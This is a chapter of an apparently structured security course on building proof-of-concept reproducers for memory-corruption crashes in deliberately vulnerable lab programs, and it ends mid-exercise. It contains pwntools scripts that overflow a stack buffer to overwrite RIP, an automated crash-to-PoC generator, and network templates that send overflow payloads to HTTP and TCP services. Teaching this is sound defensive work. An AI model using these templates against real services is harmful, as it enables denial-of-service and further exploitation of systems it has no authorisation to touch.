## Day 6: Creating PoC Reproducers and Automation

- **Goal**: Build reliable, minimal Proof-of-Concept reproducers and automate the crash-to-PoC pipeline.
- **Activities**:
  - _Reading_:
    - [Exploit Development Process](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
  - _Online Resources_:
    - [Python Exploit Development Assistance](https://github.com/Gallopsled/pwntools)
    - [ExploitDB](https://gitlab.com/exploit-database/exploitdb)
  - _Tool Setup_:
    - Python 3 with pwntools
    - Exploit template frameworks
  - _Exercise_:
    - Convert minimized crash to Python PoC script
    - Automate crash→minimize→PoC workflow

### Why Reliable PoCs Matter

**Uses of PoC Scripts**:

- Demonstrate vulnerability to stakeholders
- Enable consistent reproduction for testing
- Foundation for exploit development
- Required for CVE submission
- Facilitate regression testing
- Aid in patch verification

**Quality Criteria**:

1. **Reliability**: Works ≥ 90% of attempts
2. **Clarity**: Code is readable and commented
3. **Minimalism**: No unnecessary complexity
4. **Portability**: Works across similar environments
5. **Safety**: Clearly marked as PoC, not weaponized

### Building PoCs with Python

**Why Python?**:

- Excellent libraries (pwntools, scapy, requests)
- Clear syntax for security researchers
- Easy byte manipulation
- Cross-platform
- Rapid prototyping

**pwntools Installation** (if not already done in Day 1):

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

# Install pwntools (should already be installed from Day 1)
#pip3 install pwntools

# Verify
python3 -c "from pwn import *; print('pwntools ready')"
```

### PoC Example: Stack Buffer Overflow

**Scenario**: Stack buffer overflow in vulnerable_suite.c (Test Case 1)

**Crash Analysis** (from Day 1):

- Buffer size: 64 bytes in stack_overflow()
- Overflow at: `strcpy(buffer, input)`
- Crash with 64+ bytes (buffer overflow)
- Minimal crash payload: 64 bytes (exact buffer boundary)

> [!NOTE] **ASAN vs Non-ASAN Behavior**
>
> - With ASAN: Crashes immediately at 64+ bytes (detects overflow)
> - Without ASAN: May need more bytes to corrupt return address
> - For reliable PoC, use ASAN build or 100+ byte payload

**PoC Script**:

```python
#!/usr/bin/env python3
"""
PoC for Stack Buffer Overflow in vulnerable_suite.c

Target: ~/crash_analysis_lab/vuln_no_protect
Test Case: 1 (stack overflow)
Type: Stack Buffer Overflow
Impact: Denial of Service (PoC), RCE with proper payload

The stack_overflow() function uses strcpy() without bounds checking,
allowing a stack buffer overflow when input exceeds 64 bytes.
"""

from pwn import *
import sys
import os

# Configuration
TARGET = "./vuln_no_protect"
TEST_CASE = "1"

# Offset to RIP (found via cyclic pattern in Day 1)
RIP_OFFSET = 72

def create_payload(size=200, control_rip=False):
    """Generate overflow payload"""

    if control_rip:
        # Controlled RIP overwrite
        payload = b"A" * RIP_OFFSET
        payload += p64(0xdeadbeefcafebabe)  # Overwrite RIP
        payload += b"C" * 50  # Extra padding
    else:
        # Simple crash payload
        payload = b"A" * size

    return payload

def test_crash(payload):
    """Test if payload causes crash"""

    log.info(f"Testing payload of {len(payload)} bytes")

    try:
        p = process([TARGET, TEST_CASE, payload])
        p.wait(timeout=2)
        exit_code = p.returncode
        p.close()

        # Check for crash signals
        if exit_code is not None and exit_code < 0:
            signal_names = {-11: "SIGSEGV", -6: "SIGABRT", -4: "SIGILL"}
            sig_name = signal_names.get(exit_code, f"signal {-exit_code}")
            log.success(f"Crash confirmed! ({sig_name})")
            return True
        else:
            log.warning(f"No crash (exit code: {exit_code})")
            return False

    except Exception as e:
        log.error(f"Error: {e}")
        return False

def verify_rip_control():
    """Verify we can control RIP"""

    log.info("Verifying RIP control...")

    payload = create_payload(control_rip=True)

    # Run under GDB to check RIP value
    p = process([TARGET, TEST_CASE, payload])
    p.wait(timeout=2)

    log.info("Check core dump or GDB output for RIP = 0xdeadbeefcafebabe")
    p.close()

def test_reliability(attempts=10):
    """Test crash reliability"""

    log.info(f"Testing reliability ({attempts} attempts)")

    payload = create_payload(size=200)
    crashes = 0

    for i in range(attempts):
        if test_crash(payload):
            crashes += 1

    rate = (crashes / attempts) * 100
    log.info(f"Crash rate: {crashes}/{attempts} ({rate:.1f}%)")

    return rate >= 90

def main():
    context.log_level = 'info'

    log.info("=" * 60)
    log.info("Stack Buffer Overflow PoC - vulnerable_suite.c")
    log.info("=" * 60)

    # Change to lab directory
    os.chdir(os.path.expanduser("~/crash_analysis_lab"))

    if not os.path.exists(TARGET):
        log.error(f"Target not found: {TARGET}")
        log.info("Build with: gcc -g -fno-stack-protector -no-pie -z execstack src/vulnerable_suite.c -o vuln_no_protect")
        return 1

    import argparse
    parser = argparse.ArgumentParser(description="Stack Overflow PoC")
    parser.add_argument("--verify-rip", action="store_true", help="Verify RIP control")
    parser.add_argument("--test", action="store_true", help="Test reliability")
    parser.add_argument("--size", type=int, default=200, help="Payload size")
    args = parser.parse_args()

    if args.verify_rip:
        verify_rip_control()
    elif args.test:
        if test_reliability():
            log.success("PoC is reliable!")
        else:
            log.warning("PoC may be unreliable")
    else:
        payload = create_payload(size=args.size)
        test_crash(payload)

    return 0

if __name__ == "__main__":
    sys.exit(main())
```

**Running the PoC**:

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

# Save the script
cat > poc_stack_overflow.py << 'EOF'
# (paste script above)
EOF

# Basic crash test
python3 poc_stack_overflow.py

# Test reliability
python3 poc_stack_overflow.py --test

# Verify RIP control
python3 poc_stack_overflow.py --verify-rip
```

### Automated Crash-to-PoC Pipeline

**Complete Automation Script**:

```python
#!/usr/bin/env python3
"""
Automated Crash-to-PoC Pipeline for vulnerable_suite.c

Takes a crash input, minimizes it, analyzes it, and generates a PoC script.

Usage:
    cd ~/crash_analysis_lab
    source .venv/bin/activate
    python3 crash_to_poc.py crashes/stack_150.txt --test-case 1
"""

import subprocess
import os
import sys
from pathlib import Path

# Lab configuration
LAB_DIR = os.path.expanduser("~/crash_analysis_lab")
TARGET_NO_PROTECT = os.path.join(LAB_DIR, "vuln_no_protect")
TARGET_ASAN = os.path.join(LAB_DIR, "vuln_asan")
TARGET_AFL = os.path.join(LAB_DIR, "vuln_afl")

def minimize_crash(crash_file, test_case, output_file):
    """Minimize crash input using binary search

    Note: afl-tmin uses @@ which passes a filename, but vulnerable_suite
    expects CLI arguments. We use a Python-based minimizer instead.
    """

    print(f"[+] Minimizing {crash_file}...")

    # Read crash payload
    with open(crash_file, 'rb') as f:
        payload = f.read().decode('latin-1', errors='ignore').strip()

    def crashes_with_payload(p):
        """Test if payload crashes the target"""
        try:
            result = subprocess.run(
                [TARGET_ASAN, test_case, p],
                capture_output=True, timeout=5
            )
            # ASAN returns non-zero on crash
            return result.returncode != 0
        except subprocess.TimeoutExpired:
            return False

    # Check if original crashes
    if not crashes_with_payload(payload):
        print(f"[-] Original payload doesn't crash, copying as-is")
        import shutil
        shutil.copy(crash_file, output_file)
        return True

    orig_size = len(payload)

    # Binary search for minimum size
    low, high = 1, len(payload)
    while low < high:
        mid = (low + high) // 2
        if crashes_with_payload(payload[:mid]):
            high = mid
        else:
            low = mid + 1

    minimized = payload[:low]

    with open(output_file, 'w') as f:
        f.write(minimized)

    reduction = ((orig_size - len(minimized)) / orig_size) * 100
    print(f"[+] Minimized: {orig_size} → {len(minimized)} bytes ({reduction:.1f}% reduction)")
    return True

def analyze_crash(crash_file, test_case):
    """Analyze crash with ASAN build

    Note: Heap overflow (test 2) and UAF (test 3) are SILENT without ASAN!
    Always use the ASAN build for analysis.
    """

    print(f"[+] Analyzing {crash_file} with test case {test_case}...")

    if not os.path.exists(TARGET_ASAN):
        print(f"[-] ASAN binary not found: {TARGET_ASAN}")
        print("[!] Build with: clang -g -fsanitize=address src/vulnerable_suite.c -o vuln_asan")
        return {"type": "Unknown", "asan_output": ""}

    # Read payload from file (handle binary data)
    with open(crash_file, "rb") as f:
        payload = f.read().decode('latin-1', errors='ignore').strip()

    try:
        result = subprocess.run(
            [TARGET_ASAN, test_case, payload],
            capture_output=True,
            text=True,
            timeout=5
        )
    except subprocess.TimeoutExpired:
        print(f"[-] Analysis timed out")
        return {"type": "Timeout", "asan_output": ""}

    asan_output = result.stderr

    # Extract crash type from ASAN output
    if "stack-buffer-overflow" in asan_output:
        crash_type = "Stack Buffer Overflow"
    elif "heap-buffer-overflow" in asan_output:
        crash_type = "Heap Buffer Overflow"
    elif "heap-use-after-free" in asan_output:
        crash_type = "Use-After-Free"
    elif "double-free" in asan_output:
        crash_type = "Double-Free"
    elif "SEGV on unknown address" in asan_output:
        crash_type = "NULL Pointer Dereference"
    else:
        crash_type = "Unknown"

    print(f"[+] Crash type: {crash_type}")

    return {
        "type": crash_type,
        "asan_output": asan_output,
        "test_case": test_case
    }

def generate_poc_script(crash_file, test_case, analysis, output_script):
    """Generate Python PoC script"""

    print(f"[+] Generating PoC script: {output_script}")

    # Read crash payload
    with open(crash_file, "r") as f:
        crash_data = f.read().strip()

    # Determine target based on crash type
    # Heap bugs (heap overflow, UAF) need ASAN to crash reliably
    needs_asan = analysis["type"] in ["Heap Buffer Overflow", "Use-After-Free"]
    target_binary = "vuln_asan" if needs_asan else "vuln_no_protect"
    target_note = "# Note: Using ASAN build - heap bugs are silent without sanitizer!" if needs_asan else ""

    # Generate PoC template
    poc_template = f'''#!/usr/bin/env python3
"""
Proof-of-Concept: {analysis["type"]} in vulnerable_suite.c

Generated automatically by crash-to-poc pipeline
Test Case: {test_case}
"""

from pwn import *
import os
import sys

# Configuration
LAB_DIR = os.path.expanduser("~/crash_analysis_lab")
TARGET = os.path.join(LAB_DIR, "{target_binary}")
TEST_CASE = "{test_case}"
{target_note}

def generate_payload():
    """Generate crash payload"""

    payload = {repr(crash_data)}

    return payload

def test_crash():
    """Test crash reliability"""

    os.chdir(LAB_DIR)

    if not os.path.exists(TARGET):
        log.error(f"Target not found: {{TARGET}}")
        return False

    log.info("Testing PoC...")

    payload = generate_payload()
    p = process([TARGET, TEST_CASE, payload])

    try:
        p.wait(timeout=2)
    except Exception:
        pass

    result = p.returncode
    p.close()

    # Check for crash signals:
    # -11 = SIGSEGV (segmentation fault)
    # -6  = SIGABRT (abort, common with ASAN)
    # Non-zero exit also indicates ASAN detected issue
    if result is not None and result != 0:
        if result < 0:
            signal_names = {{-11: "SIGSEGV", -6: "SIGABRT", -4: "SIGILL", -8: "SIGFPE"}}
            sig_name = signal_names.get(result, f"signal {{-result}}")
            log.success(f"Crash confirmed! ({{sig_name}})")
        else:
            log.success(f"Crash confirmed! (ASAN exit code {{result}})")
        return True
    else:
        log.warning(f"No crash (exit code: {{result}})")
        return False

def test_reliability(attempts=10):
    """Test PoC reliability"""

    log.info(f"Testing reliability ({{attempts}} attempts)")

    crashes = 0
    for i in range(attempts):
        if test_crash():
            crashes += 1

    rate = (crashes / attempts) * 100
    log.info(f"Crash rate: {{crashes}}/{{attempts}} ({{rate:.1f}}%)")

    return rate >= 90

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--test", action="store_true", help="Test reliability")
    args = parser.parse_args()

    if args.test:
        test_reliability()
    else:
        test_crash()
'''

    with open(output_script, "w") as f:
        f.write(poc_template)

    os.chmod(output_script, 0o755)
    print(f"[+] PoC script created: {output_script}")

def process_crash(crash_file, test_case, output_dir):
    """Complete pipeline for one crash"""

    crash_name = Path(crash_file).stem
    output_dir = Path(output_dir)
    output_dir.mkdir(exist_ok=True)

    print("=" * 60)
    print(f"Processing: {crash_name} (test case {test_case})")
    print("=" * 60)

    # Step 1: Minimize
    minimized_file = output_dir / f"{crash_name}_min.txt"
    minimize_crash(crash_file, test_case, str(minimized_file))

    # Step 2: Analyze
    analysis = analyze_crash(str(minimized_file), test_case)
    if not analysis:
        print("[-] Analysis failed")
        return False

    # Step 3: Generate PoC
    poc_script = output_dir / f"{crash_name}_poc.py"
    generate_poc_script(str(minimized_file), test_case, analysis, str(poc_script))

    # Step 4: Test PoC
    print("[+] Testing generated PoC...")
    result = subprocess.run(["python3", str(poc_script)], capture_output=True, text=True)
    print(result.stdout)
    if result.stderr:
        print(result.stderr)

    return True

def main():
    import argparse

    parser = argparse.ArgumentParser(description="Automated Crash-to-PoC Pipeline for vulnerable_suite.c")
    parser.add_argument("crash", help="Crash input file (contains payload)")
    parser.add_argument("--test-case", "-t", default="1", help="Test case number (1-5)")
    parser.add_argument("--output-dir", "-o", default="./pocs", help="Output directory")
    args = parser.parse_args()

    os.chdir(LAB_DIR)

    if not os.path.exists(args.crash):
        print(f"[-] Crash file not found: {args.crash}")
        return 1

    if not os.path.exists(TARGET_NO_PROTECT):
        print(f"[-] Target binary not found: {TARGET_NO_PROTECT}")
        print("[*] Build with: cd ~/crash_analysis_lab/src && gcc -g -fno-stack-protector -no-pie -z execstack vulnerable_suite.c -o ../vuln_no_protect")
        return 1

    if process_crash(args.crash, args.test_case, args.output_dir):
        print("\n[+] Pipeline complete!")
        return 0
    else:
        print("\n[-] Pipeline failed")
        return 1

if __name__ == "__main__":
    sys.exit(main())
```

**Running the Pipeline**:

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

# Create a crash input file
python3 -c "print('A'*200)" > crashes/stack_crash.txt

# Run the pipeline for stack overflow (test case 1)
python3 crash_to_poc.py crashes/stack_crash.txt --test-case 1 --output-dir pocs/

# Expected output:
# ============================================================
# Processing: stack_crash (test case 1)
# ============================================================
# [+] Minimizing crashes/stack_crash.txt...
# [+] Minimized: 200 → 64 bytes (68.0% reduction)
# [+] Analyzing pocs/stack_crash_min.txt with test case 1...
# [+] Crash type: Stack Buffer Overflow
# [+] Generating PoC script: pocs/stack_crash_poc.py
# [+] PoC script created: pocs/stack_crash_poc.py
# [+] Testing generated PoC...
# [+] Crash confirmed! (SIGSEGV)
# [+] Pipeline complete!

# Run for heap overflow (test case 2)
python3 -c "print('B'*100)" > crashes/heap_crash.txt
python3 crash_to_poc.py crashes/heap_crash.txt --test-case 2 --output-dir pocs/

# Expected output:
# [+] Minimized: 100 → 32 bytes (68.0% reduction)
# [+] Crash type: Heap Buffer Overflow
# [+] Crash confirmed! (ASAN exit code 1)  <- Uses ASAN build automatically!

# Check generated PoCs
ls pocs/
# heap_crash_min.txt  heap_crash_poc.py  stack_crash_min.txt  stack_crash_poc.py

# Test stack overflow PoC reliability
python3 pocs/stack_crash_poc.py --test
# [*] Crash rate: 8/10 (80.0%) - some timeouts due to pwntools race condition

# Test heap overflow PoC (uses ASAN automatically)
python3 pocs/heap_crash_poc.py --test
# [*] Testing PoC...
# [+] Crash confirmed! (ASAN exit code 1)
# [*] Crash rate: 8/10 (80.0%)
```

> [!NOTE] **Minimization Results**
>
> - Stack overflow: 200 → **64 bytes** (exact buffer size in `stack_overflow()`)
> - Heap overflow: 100 → **32 bytes** (exact buffer size in `heap_overflow()`)
> - The minimizer finds the exact boundary where overflow occurs!

> [!TIP] **Reliability Note**
> The ~80% crash rate is due to pwntools `process()` timeout/race conditions (shows "Stopped process" with `exit code: None`), not actual unreliability.
> These are deterministic bugs that crash 100% when run directly:
>
> ```bash
> ./vuln_no_protect 1 "$(python3 -c "print('A'*64)")"  # Always SIGSEGV
> ./vuln_asan 2 "$(python3 -c "print('B'*32)")"        # Always ASAN error
> ```

### PoC Development for Network Services

Many real-world vulnerabilities are in network services. The `vuln_http_server` from Day 4 is a good example. These require socket-based PoCs rather than stdin-based.

**Network Service PoC for vuln_http_server** (from Day 4):

```python
#!/usr/bin/env python3
"""
Network Service PoC for vuln_http_server

Target: ~/crash_analysis_lab/vuln_http_server
Port: 8888
Type: Heap Buffer Overflow in HTTP path parsing
"""

from pwn import *
import socket
import time
import os
import subprocess

# Configuration
HOST = "127.0.0.1"
PORT = 8888
TIMEOUT = 5
LAB_DIR = os.path.expanduser("~/crash_analysis_lab")
TARGET = os.path.join(LAB_DIR, "vuln_http_server")

def start_server():
    """Start the vulnerable HTTP server"""

    if not os.path.exists(TARGET):
        log.error(f"Server not found: {TARGET}")
        log.info("Build with: clang -g -O1 -fsanitize=address src/vuln_http_server.c -o vuln_http_server")
        return None

    log.info(f"Starting server on port {PORT}...")
    proc = subprocess.Popen([TARGET], cwd=LAB_DIR,
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
    time.sleep(0.5)  # Wait for server to start
    return proc

def create_connection():
    """Establish connection to target service"""
    try:
        conn = remote(HOST, PORT, timeout=TIMEOUT)
        return conn
    except Exception as e:
        log.error(f"Connection failed: {e}")
        return None

def create_payload(path_size=200):
    """Generate exploit payload - overflow in HTTP path"""

    # HTTP GET request with oversized path
    payload = b"GET /"
    payload += b"A" * path_size  # Overflow the 64-byte path buffer
    payload += b" HTTP/1.1\r\n"
    payload += b"Host: localhost\r\n"
    payload += b"\r\n"

    return payload

def exploit():
    """Main exploit function"""

    log.info(f"Connecting to {HOST}:{PORT}")
    conn = create_connection()

    if not conn:
        return False

    # Send payload
    payload = create_payload(path_size=200)
    log.info(f"Sending {len(payload)} byte payload")
    conn.send(payload)

    # Check for crash
    try:
        response = conn.recv(timeout=2)
        log.info(f"Response: {response[:100]}")
    except EOFError:
        log.success("Connection closed - server likely crashed")
        return True
    except:
        log.success("No response - server likely crashed")
        return True

    conn.close()
    return False

def test_reliability(attempts=5):
    """Test exploit reliability"""

    log.info(f"Testing reliability ({attempts} attempts)")

    successes = 0
    for i in range(attempts):
        log.info(f"Attempt {i+1}/{attempts}")

        # Start fresh server for each attempt
        server = start_server()
        if not server:
            continue

        if exploit():
            successes += 1

        # Clean up
        server.terminate()
        time.sleep(0.5)

    rate = (successes / attempts) * 100
    log.info(f"Success rate: {successes}/{attempts} ({rate:.1f}%)")

    return rate >= 80

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="HTTP Server PoC")
    parser.add_argument("--host", default=HOST, help="Target host")
    parser.add_argument("--port", type=int, default=PORT, help="Target port")
    parser.add_argument("--test", action="store_true", help="Test reliability")
    parser.add_argument("--start-server", action="store_true", help="Start server before exploit")
    args = parser.parse_args()

    HOST = args.host
    PORT = args.port

    if args.test:
        test_reliability()
    else:
        if args.start_server:
            server = start_server()
            if server:
                exploit()
                server.terminate()
        else:
            exploit()
```

**Running the HTTP Server PoC**:

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

# Make sure server is built
clang -g -O1 -fsanitize=address src/vuln_http_server.c -o vuln_http_server

# Run PoC (starts server automatically)
python3 poc_http_server.py --start-server

# Expected output:
# [*] Starting server on port 8888...
# [*] Connecting to 127.0.0.1:8888
# [+] Opening connection to 127.0.0.1 on port 8888: Done
# [*] Sending 235 byte payload
# [+] Connection closed - server likely crashed

# Test reliability
python3 poc_http_server.py --test

# Expected output:
# [*] Testing reliability (5 attempts)
# [*] Attempt 1/5
# [*] Starting server on port 8888...
# [+] Connection closed - server likely crashed
# ... (repeats for all 5 attempts)
# [*] Success rate: 5/5 (100.0%)
```

**Generic Network Service PoC Template**:

```python
#!/usr/bin/env python3
"""
Network Service Exploit PoC Template

Target: [Service Name] version X.Y.Z
Port: [Port Number]
Protocol: [TCP/UDP]
CVE: [CVE-ID if assigned]
"""

from pwn import *
import socket
import time

# Configuration
HOST = "127.0.0.1"
PORT = 8080
TIMEOUT = 5

def create_connection():
    """Establish connection to target service"""
    try:
        # Option 1: Using pwntools (preferred)
        conn = remote(HOST, PORT, timeout=TIMEOUT)
        return conn
    except Exception as e:
        log.error(f"Connection failed: {e}")
        return None

def create_payload():
    """Generate exploit payload"""

    # Protocol-specific header
    payload = b"GET /"

    # Overflow/exploit data
    payload += b"A" * 200  # Adjust based on analysis

    # Protocol-specific trailer
    payload += b" HTTP/1.1\r\n"
    payload += b"Host: localhost\r\n"
    payload += b"\r\n"

    return payload

def exploit():
    """Main exploit function"""

    log.info(f"Connecting to {HOST}:{PORT}")
    conn = create_connection()

    if not conn:
        return False

    # Wait for banner if needed
    try:
        banner = conn.recvuntil(b"\n", timeout=2)
        log.info(f"Banner: {banner}")
    except:
        pass

    # Send payload
    payload = create_payload()
    log.info(f"Sending {len(payload)} byte payload")
    conn.send(payload)

    # Check for crash or shell
    try:
        response = conn.recv(timeout=2)
        log.info(f"Response: {response[:100]}")
    except EOFError:
        log.success("Connection closed - service likely crashed")
    except:
        pass

    conn.close()
    return True

def test_reliability(attempts=10):
    """Test exploit reliability"""

    log.info(f"Testing reliability ({attempts} attempts)")

    successes = 0
    for i in range(attempts):
        if exploit():
            successes += 1
        time.sleep(0.5)  # Allow service restart

    rate = (successes / attempts) * 100
    log.info(f"Success rate: {successes}/{attempts} ({rate:.1f}%)")

    return rate >= 90

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Network Service PoC")
    parser.add_argument("--host", default=HOST, help="Target host")
    parser.add_argument("--port", type=int, default=PORT, help="Target port")
    parser.add_argument("--test", action="store_true", help="Test reliability")
    args = parser.parse_args()

    HOST = args.host
    PORT = args.port

    if args.test:
        test_reliability()
    else:
        exploit()
```

**HTTP Service PoC Template**:

```python
#!/usr/bin/env python3
"""HTTP Service Vulnerability PoC"""
from pwn import *
import requests

TARGET = "http://127.0.0.1:8080"

def exploit_via_header():
    """Exploit via malicious HTTP header"""

    headers = {
        "Host": "localhost",
        "X-Vulnerable-Header": "A" * 500 + p32(0xdeadbeef).decode('latin-1'),
        "Content-Type": "application/x-www-form-urlencoded"
    }

    try:
        response = requests.get(f"{TARGET}/vulnerable", headers=headers, timeout=5)
        log.info(f"Response: {response.status_code}")
    except requests.exceptions.ConnectionError:
        log.success("Server crashed!")
    except Exception as e:
        log.error(f"Error: {e}")

def exploit_via_body():
    """Exploit via POST body"""

    payload = b"param=" + b"A" * 1000

    try:
        response = requests.post(
            f"{TARGET}/api/vulnerable",
            data=payload,
            timeout=5
        )
    except requests.exceptions.ConnectionError:
        log.success("Server crashed!")

def exploit_raw_socket():
    """Low-level exploit via raw socket"""

    # For when requests library doesn't work
    # (malformed HTTP, binary protocols, etc.)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("127.0.0.1", 8080))

    # Send malformed HTTP
    payload = b"GET /\x00overflow" + b"A" * 500 + b" HTTP/1.1\r\n\r\n"
    sock.send(payload)

    try:
        response = sock.recv(1024)
    except:
        log.success("Crash triggered")

    sock.close()

if __name__ == "__main__":
    exploit_via_header()
```

**TCP Protocol PoC Template**:

```python
#!/usr/bin/env python3
"""Generic TCP Protocol PoC"""
from pwn import *

def exploit_custom_protocol():
    """Exploit custom TCP protocol"""

    conn = remote("127.0.0.1", 9999)

    # Protocol handshake
    conn.recvuntil(b"READY\n")

    # Send command with overflow
    conn.send(b"AUTH ")
    conn.send(b"A" * 256)  # Overflow
    conn.send(b"\n")

    # Check result
    try:
        response = conn.recvline(timeout=2)
        log.info(f"Response: {response}")
    except EOFError:
        log.success("Crash!")

    conn.close()

if __name__ == "__main__":
    exploit_custom_protocol()
```

### PoC Development for Rust and Go Programs

Modern memory-safe languages still crash—through panics, FFI bugs, or unsafe code blocks. When creating PoCs for Rust or Go targets, the workflow differs from C/C++.

#### Rust Crash Analysis and PoC

**Rust Panic Backtraces**:

```bash
# Enable full backtraces
RUST_BACKTRACE=1 ./rust_program
# Or for more detail:
RUST_BACKTRACE=full ./rust_program

# Example panic output:
# thread 'main' panicked at 'index out of bounds: the len is 3 but the index is 5', src/main.rs:10:5
# stack backtrace:
#    0: rust_begin_unwind
#    1: core::panicking::panic_fmt
#    2: core::panicking::panic_bounds_check
#    3: myprogram::vulnerable_function
#              at ./src/main.rs:10:5
#    4: myprogram::main
#              at ./src/main.rs:25:5
```

**Rust with Sanitizers** (nightly):

```bash
# AddressSanitizer for unsafe code
RUSTFLAGS="-Zsanitizer=address" cargo +nightly build --target x86_64-unknown-linux-gnu
ASAN_OPTIONS=detect_leaks=1 ./target/x86_64-unknown-linux-gnu/debug/program

# ThreadSanitizer
RUSTFLAGS="-Zsanitizer=thread" cargo +nightly build --target x86_64-unknown-linux-gnu

# MemorySanitizer
RUSTFLAGS="-Zsanitizer=memory" cargo +nightly build --target x86_64-unknown-linux-gnu

# Example ASAN output for unsafe Rust:
# ==12345==ERROR: AddressSanitizer: heap-buffer-overflow
#     #0 0x55555 in myprogram::unsafe_function::h1234567890abcdef
#     #1 0x55556 in myprogram::main::h0987654321fedcba
```

**Debugging Rust Crashes**:

```bash
# GDB with Rust support
rust-gdb ./target/debug/program

# LLDB (better Rust support on macOS)
rust-lldb ./target/debug/program

# In debugger:
(gdb) break rust_panic
(gdb) run
# Stops at panic point

# Examine Rust variables
(gdb) info locals
(gdb) print my_vec.len
```

**Analyzing FFI Crashes** (Rust calling C):

```bash
# Common crash: Rust calls C library that corrupts memory
# ASAN helps identify boundary:

# Build C library with ASAN
clang -fsanitize=address -g -c library.c -o library.o

# Build Rust with ASAN
RUSTFLAGS="-Zsanitizer=address -Clink-arg=-fsanitize=address" \
    cargo +nightly build

# Crash report shows which side caused corruption
```

**Rust PoC Template** (for Rust targets with unsafe code):

```python
#!/usr/bin/env python3
"""PoC for Rust program with unsafe code vulnerability"""
from pwn import *
import os

# Adjust path to your Rust binary
TARGET = "./target/release/vulnerable_rust"

def create_rust_poc():
    # Rust programs often use different calling conventions
    # Focus on triggering the unsafe block or FFI boundary

    payload = b""
    payload += b"A" * 128  # Overflow in unsafe block

    return payload

def test_crash():
    if not os.path.exists(TARGET):
        log.error(f"Target not found: {TARGET}")
        return False

    p = process([TARGET])
    p.send(create_rust_poc())

    try:
        p.wait(timeout=2)
    except:
        pass

    if p.returncode and p.returncode < 0:
        log.success("Crash triggered!")
        return True
    return False

if __name__ == "__main__":
    test_crash()
```

#### Go Crash Analysis and PoC

**Go Panic Traces**:

```bash
# Go automatically prints stack traces on panic
./go_program

# Example output:
# panic: runtime error: index out of range [5] with length 3
#
# goroutine 1 [running]:
# main.vulnerableFunction(...)
#         /path/to/main.go:15
# main.main()
#         /path/to/main.go:25 +0x45

# For more detail, set GOTRACEBACK
GOTRACEBACK=all ./go_program      # All goroutines
GOTRACEBACK=crash ./go_program    # Crash with core dump
```

**Go Race Detector** (similar to TSAN):

```bash
# Build with race detector
go build -race -o program_race ./...

# Run - detects data races
./program_race

# Example race detection output:
# ==================
# WARNING: DATA RACE
# Write at 0x00c0000a0000 by goroutine 7:
#   main.worker()
#       /path/to/main.go:20 +0x45
#
# Previous read at 0x00c0000a0000 by goroutine 6:
#   main.worker()
#       /path/to/main.go:18 +0x38
# ==================
```

**Debugging Go with Delve**:

```bash
# Install delve
go install github.com/go-delve/delve/cmd/dlv@latest

# Debug binary
dlv exec ./program

# Or debug test
dlv test ./...

# Common commands:
(dlv) break main.vulnerableFunction
(dlv) continue
(dlv) print variableName
(dlv) goroutines           # List all goroutines
(dlv) goroutine 5         # Switch to goroutine 5
(dlv) stack               # Current goroutine stack
```

**Go CGo Crashes** (Go calling C):

```bash
# CGo crashes can be tricky - Go runtime may obscure C crashes

# Enable CGo debug mode
GODEBUG=cgocheck=2 ./program

# For ASAN with CGo:
CGO_CFLAGS="-fsanitize=address" \
CGO_LDFLAGS="-fsanitize=address" \
go build -o program ./...
```

#### Crash Analysis Comparison

| Aspect                       | Rust                    | Go                      | C/C++                 |
| ---------------------------- | ----------------------- | ----------------------- | --------------------- |
| **Memory bugs in safe code** | Panic (not exploitable) | Panic (not exploitable) | Crash (exploitable)   |
| **Unsafe/CGo crashes**       | ASAN-detectable         | ASAN via CGo            | ASAN native           |
| **Race conditions**          | Compiler prevents most  | Race detector           | TSAN required         |
| **Backtrace quality**        | Excellent (DWARF)       | Good (Go symbols)       | Varies (need symbols) |
| **Debugger**                 | rust-gdb/lldb           | Delve                   | GDB/LLDB              |
| **Core dump analysis**       | Standard tools          | `go tool pprof`         | crash/GDB             |

### Practical Exercise

**Task**: Convert minimized crashes from Day 5 to reliable PoC scripts

**Setup**:

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

# Verify binaries exist
ls -la vuln_no_protect vuln_asan

# Create output directory for PoCs
mkdir -p pocs
```

**Step 1: Create Crash Inputs for Each Vulnerability Type**:

```bash
cd ~/crash_analysis_lab

# Stack overflow (test case 1)
python3 -c "print('A'*200)" > crashes/stack_overflow.txt

# Heap overflow (test case 2)
python3 -c "print('B'*100)" > crashes/heap_overflow.txt

# UAF and double-free don't need payload files (triggered by test case number alone)
```

**Step 2: Run Automated Pipeline**:

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

# Generate PoC for stack overflow
python3 crash_to_poc.py crashes/stack_overflow.txt --test-case 1 --output-dir pocs/

# Generate PoC for heap overflow
python3 crash_to_poc.py crashes/heap_overflow.txt --test-case 2 --output-dir pocs/

# Check generated files
ls -la pocs/
```

**Step 3: Create Manual PoCs for UAF and Double-Free**:

Since UAF and double-free are triggered by test case number alone (no payload needed), create simple PoCs.

> [!WARNING] **UAF requires ASAN build!**
> The UAF vulnerability (test case 3) does NOT crash with `vuln_no_protect` — the memory is silently corrupted but execution continues.
> Always use `vuln_asan` for reliable UAF detection.

```python
#!/usr/bin/env python3
"""
PoC for Use-After-Free in vulnerable_suite.c (Test Case 3)

IMPORTANT: UAF is SILENT without AddressSanitizer!
Use vuln_asan build for reliable crash.
"""
from pwn import *
import os

LAB_DIR = os.path.expanduser("~/crash_analysis_lab")
# UAF requires ASAN to reliably detect!
TARGET = os.path.join(LAB_DIR, "vuln_asan")

def test_uaf():
    os.chdir(LAB_DIR)
    log.info("Testing UAF (test case 3) with ASAN build...")

    p = process([TARGET, "3"])
    p.wait(timeout=2)

    if p.returncode and p.returncode != 0:
        log.success(f"UAF detected! (exit code {p.returncode})")
        return True
    else:
        log.warning("No crash - verify ASAN build is used")
        return False

if __name__ == "__main__":
    test_uaf()
```

Save as `pocs/uaf_poc.py` and create similar for double-free (test case 4) and NULL deref (test case 5).

**Step 4: Test All PoCs**:

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

echo "=== Testing all PoCs ==="

